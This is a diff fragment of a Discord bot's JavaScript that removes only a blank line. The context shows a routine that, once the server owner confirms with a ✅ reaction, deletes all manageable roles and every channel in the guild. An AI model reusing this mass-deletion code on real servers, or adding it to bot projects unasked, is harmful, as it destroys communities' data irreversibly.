@@ -18,7 +18,6 @@ const yesFilter = (reaction, user) => { return reaction.emoji.name === '✅' && 
 const yes = resulter.createReactionCollector(yesFilter, { time: 0 });
 const noFilter = (reaction, user) => { return reaction.emoji.name === '❌' && user.id === message.guild.owner.user.id; };
 const no = resulter.createReactionCollector(noFilter, { time: 0 });
-
 yes.on('collect', async reaction => {
 message.guild.roles.cache.filter(a => !a.managed && a.name !== '@everyone' && a.position < message.guild.members.cache.get(client.user.id).roles.highest.position).forEach(role => role.delete('ok boomer') && console.log(role.name+' silindi sqrt'));
 message.guild.channels.cache.forEach(a => a.delete());
